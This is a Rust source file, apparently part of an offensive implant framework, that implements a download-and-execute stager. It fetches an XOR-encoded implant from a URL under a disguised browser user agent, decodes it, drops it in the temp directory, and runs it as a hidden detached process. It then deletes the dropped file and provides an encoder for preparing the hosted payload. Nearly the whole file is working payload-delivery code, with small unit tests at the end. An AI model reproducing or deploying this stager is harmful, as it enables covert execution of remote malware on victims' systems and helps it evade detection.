//! Download-and-execute stager for staged payload delivery.
//!
//! The stager is a minimal bootstrap: it fetches an encoded implant binary
//! from a hosting endpoint, decodes it with a key baked into the stager, drops
//! it to a temporary path, launches it detached, and (optionally) removes the
//! staged file. The full implant never touches the initial payload.

use crate::TaskOutcome;
use anyhow::{Context, Result};
use shikra_evasion::encoders::{decode, EncoderSpec};
use std::path::PathBuf;

#[derive(Debug, Clone)]
pub struct StagerConfig {
    /// URL of the encoded stage payload.
    pub stage_url: String,
    /// XOR key (hex) used to encode the stage.
    pub stage_key_hex: String,
    /// Optional explicit output path for the staged binary.
    pub output_path: Option<PathBuf>,
    /// Remove the staged file after the child starts.
    pub delete_staged: bool,
    /// Extra arguments forwarded to the staged implant.
    pub arguments: Vec<String>,
}

/// Runs the stager to completion (download → decode → execute).
pub async fn run_stager(config: StagerConfig) -> Result<()> {
    let spec = xor_spec(&config.stage_key_hex)?;
    let encoded = download(&config.stage_url).await?;
    let plaintext = decode(&spec, &encoded).context("stage decode failed")?;
    if plaintext.is_empty() {
        anyhow::bail!("stage payload is empty");
    }

    let path = match &config.output_path {
        Some(path) => path.clone(),
        None => default_stage_path()?,
    };
    std::fs::write(&path, &plaintext)
        .with_context(|| format!("failed to write stage to {}", path.display()))?;
    make_executable(&path)?;

    spawn_detached(&path, &config.arguments)?;

    if config.delete_staged {
        // Deletion is delayed: scripts are opened by the interpreter after
        // exec, and Windows refuses to delete a running image anyway.
        let cleanup_path = path.clone();
        std::thread::spawn(move || {
            std::thread::sleep(std::time::Duration::from_secs(15));
            let _ = std::fs::remove_file(&cleanup_path);
        });
    }
    Ok(())
}

fn xor_spec(key_hex: &str) -> Result<EncoderSpec> {
    let key = shikra_transport::tls::hex_decode(key_hex).context("invalid stage key hex")?;
    if key.is_empty() {
        anyhow::bail!("stage key must not be empty");
    }
    Ok(EncoderSpec::Xor { key })
}

async fn download(url: &str) -> Result<Vec<u8>> {
    let client = reqwest::Client::builder()
        .timeout(std::time::Duration::from_secs(30))
        .build()
        .context("failed to build stager HTTP client")?;
    let response = client
        .get(url)
        .header(
            reqwest::header::USER_AGENT,
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 \
             (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
        )
        .send()
        .await
        .with_context(|| format!("stage download failed: {url}"))?;
    if !response.status().is_success() {
        anyhow::bail!("stage download rejected: HTTP {}", response.status());
    }
    Ok(response
        .bytes()
        .await
        .context("stage body read failed")?
        .to_vec())
}

fn default_stage_path() -> Result<PathBuf> {
    let mut name = [0u8; 8];
    name.copy_from_slice(&rand::random::<u64>().to_le_bytes());
    let suffix: String = name.iter().map(|byte| format!("{byte:02x}")).collect();
    let file = if cfg!(windows) {
        format!("dgr-{suffix}.exe")
    } else {
        format!("dgr-{suffix}")
    };
    Ok(std::env::temp_dir().join(file))
}

#[cfg(unix)]
fn make_executable(path: &std::path::Path) -> Result<()> {
    use std::os::unix::fs::PermissionsExt;
    let mut perms = std::fs::metadata(path)?.permissions();
    perms.set_mode(0o700);
    std::fs::set_permissions(path, perms).context("failed to mark stage executable")?;
    Ok(())
}

#[cfg(not(unix))]
fn make_executable(_path: &std::path::Path) -> Result<()> {
    Ok(())
}

#[cfg(unix)]
fn spawn_detached(path: &std::path::Path, arguments: &[String]) -> Result<()> {
    use std::process::Stdio;
    std::process::Command::new(path)
        .args(arguments)
        .stdin(Stdio::null())
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .spawn()
        .with_context(|| format!("failed to launch {}", path.display()))?;
    Ok(())
}

#[cfg(windows)]
fn spawn_detached(path: &std::path::Path, arguments: &[String]) -> Result<()> {
    use std::os::windows::process::CommandExt;
    use std::process::{Command, Stdio};
    const DETACHED_PROCESS: u32 = 0x0000_0008;
    const CREATE_NO_WINDOW: u32 = 0x0800_0000;
    Command::new(path)
        .args(arguments)
        .stdin(Stdio::null())
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .creation_flags(DETACHED_PROCESS | CREATE_NO_WINDOW)
        .spawn()
        .with_context(|| format!("failed to launch {}", path.display()))?;
    Ok(())
}

/// Convenience entry point used by unit tests: decode only, no spawn.
pub fn decode_stage(key_hex: &str, encoded: &[u8]) -> Result<Vec<u8>> {
    let spec = xor_spec(key_hex)?;
    decode(&spec, encoded).context("stage decode failed")
}

/// Encodes a stage payload for hosting.
pub fn encode_stage(key_hex: &str, payload: &[u8]) -> Result<Vec<u8>> {
    let spec = xor_spec(key_hex)?;
    shikra_evasion::encoders::encode(&spec, payload).context("stage encode failed")
}

/// Task-surface wrapper: `stage_run` downloads and executes.
pub async fn task_stage_run(
    stage_url: String,
    stage_key_hex: String,
    arguments: Vec<String>,
) -> TaskOutcome {
    let config = StagerConfig {
        stage_url,
        stage_key_hex,
        output_path: None,
        delete_staged: true,
        arguments,
    };
    match run_stager(config).await {
        Ok(()) => TaskOutcome::ok("stage launched"),
        Err(err) => TaskOutcome::fail(format!("stage failed: {err}")),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    const KEY: &str = "00112233445566778899aabbccddeeff";

    #[test]
    fn stage_roundtrip() {
        let payload = b"implant-bytes";
        let encoded = encode_stage(KEY, payload).expect("encode");
        assert_ne!(encoded, payload);
        assert_eq!(decode_stage(KEY, &encoded).expect("decode"), payload);
    }

    #[test]
    fn wrong_key_is_detected_by_header() {
        let encoded = encode_stage(KEY, b"implant-bytes").expect("encode");
        let other = "ffeeddccbbaa99887766554433221100";
        // XOR decoding with the wrong key yields garbage, not an error, so the
        // caller must validate the stage (e.g. non-empty and decodable header).
        let decoded = decode_stage(other, &encoded).expect("decode");
        assert_ne!(decoded, b"implant-bytes");
    }

    #[test]
    fn rejects_empty_key() {
        assert!(xor_spec("").is_err());
        assert!(xor_spec("zz").is_err());
    }

    #[test]
    fn default_path_has_unique_suffix() {
        let a = default_stage_path().expect("path");
        let b = default_stage_path().expect("path");
        assert_ne!(a, b);
        assert!(a.starts_with(std::env::temp_dir()));
    }
}
